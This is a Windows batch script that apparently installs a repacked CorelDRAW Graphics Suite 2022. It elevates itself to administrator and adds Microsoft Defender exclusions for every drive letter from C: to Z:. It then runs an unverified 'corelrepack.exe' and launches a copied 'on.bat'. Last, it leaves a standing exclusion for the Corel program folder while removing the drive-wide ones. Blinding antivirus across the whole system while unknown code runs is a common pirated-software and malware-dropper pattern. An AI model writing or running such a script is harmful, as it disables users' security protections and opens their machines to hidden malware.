NET SESSION
IF %ERRORLEVEL% NEQ 0 GOTO ELEVATE
GOTO ADMINTASKS

:ELEVATE
CD /d %~dp0
powershell -Command "Start-Process %~nx0 -Verb RunAs"
rem MSHTA "javascript: var shell = new ActiveXObject('shell.application'); shell.ShellExecute('%~nx0', '', '', 'runas', 1);close();"
EXIT

:ADMINTASKS
IF EXIST "%PROGRAMFILES(X86)%" (GOTO 64BIT) ELSE (GOTO 32BIT)

:64BIT
powershell Add-MpPreference -ExclusionPath 'C:\'
powershell Add-MpPreference -ExclusionPath 'D:\'
powershell Add-MpPreference -ExclusionPath 'E:\'
powershell Add-MpPreference -ExclusionPath 'F:\'
powershell Add-MpPreference -ExclusionPath 'G:\'
powershell Add-MpPreference -ExclusionPath 'H:\'
powershell Add-MpPreference -ExclusionPath 'I:\'
powershell Add-MpPreference -ExclusionPath 'J:\'
powershell Add-MpPreference -ExclusionPath 'K:\'
powershell Add-MpPreference -ExclusionPath 'L:\'
powershell Add-MpPreference -ExclusionPath 'M:\'
powershell Add-MpPreference -ExclusionPath 'N:\'
powershell Add-MpPreference -ExclusionPath 'O:\'
powershell Add-MpPreference -ExclusionPath 'P:\'
powershell Add-MpPreference -ExclusionPath 'Q:\'
powershell Add-MpPreference -ExclusionPath 'R:\'
powershell Add-MpPreference -ExclusionPath 'S:\'
powershell Add-MpPreference -ExclusionPath 'T:\'
powershell Add-MpPreference -ExclusionPath 'U:\'
powershell Add-MpPreference -ExclusionPath 'V:\'
powershell Add-MpPreference -ExclusionPath 'W:\'
powershell Add-MpPreference -ExclusionPath 'X:\'
powershell Add-MpPreference -ExclusionPath 'Y:\'
powershell Add-MpPreference -ExclusionPath 'Z:\'
pause
powershell start "corelrepack.exe"
pause
Copy "%~dp0Jamu\on.bat" "%PROGRAMFILES%\Corel\CorelDRAW Graphics Suite 2022\Programs64\on.bat"
start "on.bat" "%PROGRAMFILES%\Corel\CorelDRAW Graphics Suite 2022\Programs64\on.bat"
powershell Add-MpPreference -ExclusionPath 'C:\Program Files\Corel\'
powershell Remove-MpPreference -ExclusionPath 'C:\'
powershell Remove-MpPreference -ExclusionPath 'D:\'
powershell Remove-MpPreference -ExclusionPath 'E:\'
powershell Remove-MpPreference -ExclusionPath 'F:\'
powershell Remove-MpPreference -ExclusionPath 'G:\'
powershell Remove-MpPreference -ExclusionPath 'H:\'
powershell Remove-MpPreference -ExclusionPath 'I:\'
powershell Remove-MpPreference -ExclusionPath 'J:\'
powershell Remove-MpPreference -ExclusionPath 'K:\'
powershell Remove-MpPreference -ExclusionPath 'L:\'
powershell Remove-MpPreference -ExclusionPath 'M:\'
powershell Remove-MpPreference -ExclusionPath 'N:\'
powershell Remove-MpPreference -ExclusionPath 'O:\'
powershell Remove-MpPreference -ExclusionPath 'P:\'
powershell Remove-MpPreference -ExclusionPath 'Q:\'
powershell Remove-MpPreference -ExclusionPath 'R:\'
powershell Remove-MpPreference -ExclusionPath 'S:\'
powershell Remove-MpPreference -ExclusionPath 'T:\'
powershell Remove-MpPreference -ExclusionPath 'U:\'
powershell Remove-MpPreference -ExclusionPath 'V:\'
powershell Remove-MpPreference -ExclusionPath 'W:\'
powershell Remove-MpPreference -ExclusionPath 'X:\'
powershell Remove-MpPreference -ExclusionPath 'Y:\'
powershell Remove-MpPreference -ExclusionPath 'Z:\'
GOTO END

:32BIT
:END 
timeout /t 5
exit